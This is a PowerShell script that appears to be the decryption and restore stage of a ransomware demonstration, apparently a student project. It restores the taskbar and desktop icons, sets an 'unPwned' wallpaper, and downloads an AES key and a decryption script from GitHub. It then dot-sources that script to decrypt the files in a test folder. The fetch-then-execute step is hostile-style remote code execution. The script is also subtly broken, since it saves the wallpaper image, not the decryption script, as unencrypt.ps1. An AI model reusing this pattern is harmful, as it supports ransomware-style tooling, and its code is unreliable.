Add-Type -TypeDefinition @"
    using System;
    using System.Runtime.InteropServices;

    public class Wallpaper {
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}

    public class Taskbar {
        [DllImport("user32.dll")]
        public static extern IntPtr FindWindow(string className, string windowText);
        [DllImport("user32.dll")]
        public static extern int ShowWindow(IntPtr hwnd, int command);

        public const int SW_HIDE = 0;
        public const int SW_SHOW = 1;
    }
"@


try{
Start-Transcript -Path "C:\Users\ionut\Downloads\logs.txt"

$taskbarHwnd = [Taskbar]::FindWindow("Shell_TrayWnd", "")
[Taskbar]::ShowWindow($taskbarHwnd, [Taskbar]::SW_SHOW)

# Descarca imaginea
$imageURL = "https://similarpng.com/wp-content/uploadPngfree/thumbnail/2024/02/Business-Technology-Digital-High-Tech-World-Background.png"
$outputPath = "C:\Users\ionut\Downloads\unPwned.jpg" 
Invoke-WebRequest -Uri $imageURL -OutFile $outputPath 
Write-Output "Image downloaded successfully to $outputPath"

# Descarca functie unencrypt
$scriptURL = "https://github.com/haiduc29/Script-Licenta/blob/main/unencrypt.ps1"
$outputPath = "C:\Users\ionut\Downloads\unencrypt.ps1" 
Invoke-WebRequest -Uri $imageURL -OutFile $outputPath 


# Seteaza imaginea descarcata ca desktop background
[Wallpaper]::SystemParametersInfo(20, 0, "C:\Users\ionut\Downloads\unPwned.jpg" , 3)


# Define the URL of the file to download
$fileUrl = "https://raw.githubusercontent.com/haiduc29/Script-Licenta/main/secret.xml"

# Define the path where the file will be saved
$outputPath = "C:\Users\ionut\Downloads\secret.xml"

# Download the file
Invoke-WebRequest -Uri $fileUrl -OutFile $outputPath
# Define the path to the certificate and the password
$secretPath = "C:\Users\ionut\Downloads\secret.xml"

#secretKey
$key = Import-CliXml -Path C:\Users\ionut\Downloads\secret.xml

$files = Get-ChildItem "C:\Users\ionut\Desktop\Test"

. C:\Users\ionut\Downloads\unencrypt.ps1

for ($i=0; $i -lt $files.Count; $i++) {
    $outfile = $files[$i].FullName
    Unprotect-File $outfile -Algorithm AES -Key $key -RemoveSource 
}

Stop-Transcript

# Unhide icons on desktop
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name HideIcons -Value 0

Stop-Transcript

}
catch{"Error"}
